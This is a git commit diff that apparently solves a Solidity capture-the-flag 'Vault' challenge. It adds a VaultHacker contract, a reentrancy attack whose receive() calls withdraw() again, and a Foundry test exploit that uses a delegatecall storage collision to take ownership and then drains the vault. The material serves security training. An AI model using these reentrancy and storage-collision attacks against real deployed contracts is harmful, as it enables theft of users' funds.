49fdd5d627110ba89d9017562c6b688e1f3f8581
Jason <2045330878@qq.com>
2024-02-22 17:56:19 +0800

    [add] hack the vault contract

---
+++ src/VaultHacker.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Vault.sol";
+
+contract VaultHacker {
+    address public owner;
+    address payable public vault;
+
+    constructor(address _vault) {
+        owner = msg.sender;
+        vault = payable(_vault);
+    }
+
+    function deposit() external payable {
+        require(msg.sender == owner, "Not owner");
+        Vault(vault).deposit{value: msg.value}();
+    }
+
+    function withdraw() external payable {
+        require(msg.sender == owner, "Not owner");
+        Vault(vault).withdraw();
+    }
+
+    receive() external payable {
+        Vault(vault).withdraw();
+    }
+}
--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -1,18 +1,18 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.20;
 
-import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import {Test, console} from "forge-std/Test.sol";
 import "../src/Vault.sol";
-
-
-
+import "../src/VaultHacker.sol";
 
 contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
+    VaultHacker public vaultHacker;
 
-    address owner = address (1);
-    address palyer = address (2);
+    address owner = address(1);
+    address hacker = address(2);
 
     function setUp() public {
         vm.deal(owner, 1 ether);
@@ -21,16 +21,20 @@ contract VaultExploiter is Test {
         logic = new VaultLogic(bytes32("0x1234"));
         vault = new Vault(address(logic));
 
-        vault.deposite{value: 0.1 ether}();
+        vault.deposit{value: 0.1 ether}();
         vm.stopPrank();
 
     }
 
     function testExploit() public {
-        vm.deal(palyer, 1 ether);
-        vm.startPrank(palyer);
-
-        // add your hacker code.
+        address logicAddr = address(logic);
+        vm.deal(hacker, 1 ether);
+        vm.startPrank(hacker);
+        address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32(uint256(uint160(logicAddr))), hacker));
+        vault.openWithdraw();
+        vaultHacker = new VaultHacker(address(vault));
+        vaultHacker.deposit{value: 0.1 ether}();
+        vaultHacker.withdraw();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
